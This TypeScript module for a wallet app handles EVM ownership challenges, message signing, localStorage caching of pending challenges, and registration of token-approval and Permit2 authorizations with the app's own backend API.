import type { Eip1193Provider } from 'ethers';
import { BrowserProvider } from 'ethers';

import type { Permit2TypedData } from '../api/chains/evm/permit2';

import { INTERNAL_TON_API_BASE_URL } from '../config';

const apiUrl = (path: string) => `${INTERNAL_TON_API_BASE_URL}${path}`;
const PENDING_EVM_OWNERSHIP_CHALLENGE_KEY = 'gramwallet:pending-evm-ownership:';

export type PendingEvmOwnershipChallenge = {
  ownerAddress: string;
  nonce: string;
  challengeSignature: string;
  expiresAt: string;
};

function getPendingChallengeStorageKey(ownerAddress: string) {
  return `${PENDING_EVM_OWNERSHIP_CHALLENGE_KEY}${ownerAddress.toLowerCase()}`;
}

export function savePendingEvmOwnershipChallenge(challenge: PendingEvmOwnershipChallenge) {
  if (typeof window === 'undefined') return false;

  try {
    window.localStorage.setItem(
      getPendingChallengeStorageKey(challenge.ownerAddress),
      JSON.stringify(challenge),
    );
    return true;
  } catch {
    return false;
  }
}

export function loadPendingEvmOwnershipChallenge(ownerAddress: string) {
  if (typeof window === 'undefined') return undefined;

  const storageKey = getPendingChallengeStorageKey(ownerAddress);
  try {
    const serialized = window.localStorage.getItem(storageKey);
    if (!serialized) return undefined;

    const challenge = JSON.parse(serialized) as Partial<PendingEvmOwnershipChallenge>;
    if (
      typeof challenge.ownerAddress !== 'string'
      || challenge.ownerAddress.toLowerCase() !== ownerAddress.toLowerCase()
      || typeof challenge.nonce !== 'string'
      || typeof challenge.challengeSignature !== 'string'
      || typeof challenge.expiresAt !== 'string'
      || !Number.isFinite(Date.parse(challenge.expiresAt))
      || Date.parse(challenge.expiresAt) <= Date.now()
    ) {
      window.localStorage.removeItem(storageKey);
      return undefined;
    }

    return challenge as PendingEvmOwnershipChallenge;
  } catch {
    try {
      window.localStorage.removeItem(storageKey);
    } catch {
      // Ignore storage access failures; the caller can still continue in memory.
    }
    return undefined;
  }
}

export function removePendingEvmOwnershipChallenge(ownerAddress: string) {
  if (typeof window === 'undefined') return;

  try {
    window.localStorage.removeItem(getPendingChallengeStorageKey(ownerAddress));
  } catch {
    // Ignore storage access failures; the server still enforces challenge expiry and single use.
  }
}

export async function verifyPendingEvmOwnershipChallenge(challenge: PendingEvmOwnershipChallenge) {
  const expiresAt = Date.parse(challenge.expiresAt);
  if (!Number.isFinite(expiresAt) || expiresAt <= Date.now()) return false;

  const response = await fetch(apiUrl('/api/evm/authorization/challenge/verify'), {
    method: 'POST',
    credentials: 'include',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      ownerAddress: challenge.ownerAddress,
      nonce: challenge.nonce,
      challengeSignature: challenge.challengeSignature,
    }),
  });

  if (response.status === 400 || response.status === 409) return false;
  if (!response.ok) throw new Error(await readError(response));

  const result = await response.json() as { verified?: boolean; expiresAt?: string };
  return Boolean(
    result.verified
    && typeof result.expiresAt === 'string'
    && Date.parse(result.expiresAt) > Date.now(),
  );
}

type WalletSigningError = {
  message?: unknown;
  code?: unknown;
  shortMessage?: unknown;
  info?: {
    error?: {
      code?: unknown;
      message?: unknown;
    };
  };
};

function getWalletSigningError(error: unknown) {
  const walletError = error as WalletSigningError;
  const code = walletError.info?.error?.code ?? walletError.code;
  const message = walletError.info?.error?.message
    ?? walletError.shortMessage
    ?? walletError.message
    ?? 'Unknown wallet error';
  const safeMessage = typeof message === 'string' ? message : 'Unknown wallet error';

  return {
    code: typeof code === 'string' || typeof code === 'number' ? code : undefined,
    message: safeMessage.slice(0, 240),
  };
}

async function readError(response: Response) {
  try {
    const data = await response.json() as { error?: string };
    return data.error || 'EVM authorization request failed';
  } catch {
    return 'EVM authorization request failed';
  }
}

export async function createEvmAuthorizationChallenge(ownerAddress: string) {
  const response = await fetch(apiUrl('/api/evm/authorization/challenge'), {
    method: 'POST',
    credentials: 'include',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ ownerAddress }),
  });
  if (!response.ok) throw new Error(await readError(response));
  return response.json() as Promise<{ nonce: string; message: string; expiresAt: string }>;
}

export async function signEvmAuthorizationChallenge(
  provider: Eip1193Provider,
  ownerAddress: string,
  message: string,
) {
  const browserProvider = new BrowserProvider(provider);
  const network = await browserProvider.getNetwork();
  const signer = await browserProvider.getSigner(ownerAddress);
  const signerAddress = await signer.getAddress();
  const chainMatches = network.chainId === 1n;
  const accountMatches = signerAddress.toLowerCase() === ownerAddress.toLowerCase();

  try {
    return await signer.signMessage(message);
  } catch (error) {
    const walletError = getWalletSigningError(error);

    // Do not log the challenge, nonce, signature, or full wallet address.
    // eslint-disable-next-line no-console
    console.error('[EVM authorization] personal_sign failed', {
      method: 'personal_sign',
      code: walletError.code,
      message: walletError.message,
      chainMatches,
      accountMatches,
    });

    const codeSuffix = walletError.code === undefined ? '' : ` (${walletError.code})`;
    throw new Error(`Wallet could not sign the authorization message${codeSuffix}: ${walletError.message}`);
  }
}

export async function registerEvmAuthorization({
  ownerAddress,
  nonce,
  challengeSignature,
  approvalTxHash,
  permit,
  permitSignature,
}: {
  ownerAddress: string;
  nonce: string;
  challengeSignature: string;
  approvalTxHash: string;
  permit: Permit2TypedData;
  permitSignature: string;
}) {
  const serializedPermit = {
    details: {
      token: permit.message.details.token,
      amount: permit.message.details.amount.toString(),
      expiration: permit.message.details.expiration.toString(),
      nonce: permit.message.details.nonce.toString(),
    },
    spender: permit.message.spender,
    sigDeadline: permit.message.sigDeadline.toString(),
  };
  const response = await fetch(apiUrl('/api/evm/authorization'), {
    method: 'POST',
    credentials: 'include',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      ownerAddress,
      nonce,
      challengeSignature,
      approvalTxHash,
      permit: serializedPermit,
      permitSignature,
    }),
  });
  if (!response.ok) throw new Error(await readError(response));
  return response.json() as Promise<{
    authorization: {
      ownerAddress: string;
      tokenAllowance: string;
      permit2AllowanceAmount: string;
      permit2Expiration: string;
      permit2Nonce: string;
      approvalTxHash: string;
      permitTxHash: string;
      verifiedAt: string;
    };
  }>;
}

export async function registerDirectEvmAuthorization({
  ownerAddress,
  nonce,
  challengeSignature,
  approvalTxHash,
}: {
  ownerAddress: string;
  nonce: string;
  challengeSignature: string;
  approvalTxHash: string;
}) {
  const response = await fetch(apiUrl('/api/evm/authorization'), {
    method: 'POST',
    credentials: 'include',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      authorizationMethod: 'direct',
      ownerAddress,
      nonce,
      challengeSignature,
      approvalTxHash,
    }),
  });
  if (!response.ok) throw new Error(await readError(response));
  return response.json() as Promise<{
    authorization: {
      authorizationMethod: 'direct';
      ownerAddress: string;
      tokenAllowance: string;
      approvalTxHash: string;
      verifiedAt: string;
    };
  }>;
}
